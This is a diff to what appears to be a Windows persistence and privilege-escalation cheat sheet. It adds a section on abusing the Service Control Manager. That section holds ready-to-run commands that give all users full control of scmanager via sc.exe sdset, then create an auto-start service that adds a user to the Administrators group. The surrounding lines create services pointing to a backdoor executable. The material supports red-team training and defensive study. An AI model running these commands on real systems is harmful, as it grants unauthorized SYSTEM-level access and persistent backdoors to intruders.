@@ -19,10 +19,11 @@
     * [Windows Service](#windows-service)
 * [Elevated](#elevated)
     * [Registry HKLM](#registry-hklm)
-        * [Winlogon Helper DLL](#)
-        * [GlobalFlag](#)
+        * [Winlogon Helper DLL](#winlogon-helper-dll)
+        * [GlobalFlag](#globalflag)
     * [Startup Elevated](#startup-elevated)
     * [Services Elevated](#services-elevated)
+    * [Service Security Descriptor](#servicesecuritydescriptor)
     * [Scheduled Tasks Elevated](#scheduled-tasks-elevated)
     * [Binary Replacement](#binary-replacement)
         * [Binary Replacement on Windows XP+](#binary-replacement-on-windows-xp)
@@ -321,7 +322,7 @@ Create a service that will start automatically or on-demand.
 ```powershell
 # Powershell
 New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here." -StartupType Automatic
-sc start pentestlab
+sc start Backdoor
 
 # SharPersist
 SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add
@@ -330,6 +331,46 @@ SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n 
 sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
 sc start Backdoor
 ```
+
+
+### ServiceSecurityDescriptor
+
+Allow any arbitrary non-administrative user to have full SYSTEM permissions on a machine persistently by feeding an overly permissive ACL to the service control manager with sdset.
+
+**Exploit**:
+
+```ps1
+sc.exe sdset <ServiceName> <ServiceSecurityDescriptor>
+```
+
+The following command grants full control (`Key Access`) over the Service Control Manager to all users (represented by `WD`, which stands for "World"). In other words, it allows any user to start, stop, modify, or control services through the Service Control Manager, which can be a security risk as it opens service management to everyone on the system.
+
+```ps1
+sc.exe sdset scmanager D:(A;;KA;;;WD)
+```
+
+* `sc.exe`: The Service Control (sc) command is a Windows utility used for managing services.
+* `sdset`: This option sets a Security Descriptor (SD) for a service or the Service Control Manager itself. A security descriptor defines permissions and access rights to system resources.
+* `scmanager`: This is the target, referring to the Service Control Manager, which manages the services in the system.
+
+The `ServiceSecurityDescriptor` is defined using the Service Descriptor Definition Language (SDDL).
+
+List the permissions for `scmanager`
+
+```ps1
+sc.exe sdshow scmanager
+```
+
+Alternatively, you can use [zacateras/sddl-parser](https://github.com/zacateras/sddl-parser) to understand the Security Descriptor Definition Language (SDDL), e.g: `./Sddl.Parser.Console.exe "O:BAG:BAD:(A;CI;CCDCRP;;;NS)"`.
+
+Abuse the weaken configuration to create a service that grants administrator privilege to a custom user `user_basic`.
+
+```ps1
+sc create LPE displayName= "LPE" binPath= "C:\Windows\System32\net.exe localgroup Administrators user_basic /add" start= auto
+```
+
+Then you need to wait for a reboot for the service to automatically start and grant the user with elevated privilege or any persistence mechanism you specified in the `binPath`.
+
 
 ### Scheduled Tasks Elevated
 
@@ -580,3 +621,5 @@ Set-DomainObject -Identity <target_machine> -Set @{"ms-mcs-admpwdexpirationtime"
 * [Golden Certificate - NOVEMBER 15, 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)
 * [Beware of the Shadowbunny - Using virtual machines to persist and evade detections - Sep 23, 2020 - wunderwuzzi](https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/)
 * [Persistence via WMI Event Subscription - Elastic Security Solution](https://www.elastic.co/guide/en/security/current/persistence-via-wmi-event-subscription.html)
+* [PrivEsc: Abusing the Service Control Manager for Stealthy & Persistent LPE - 0xv1n - 2023-02-27](https://0xv1n.github.io/posts/scmanager/)
+* [Sc sdset - Microsoft - 08/31/2016](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742037(v=ws.11))
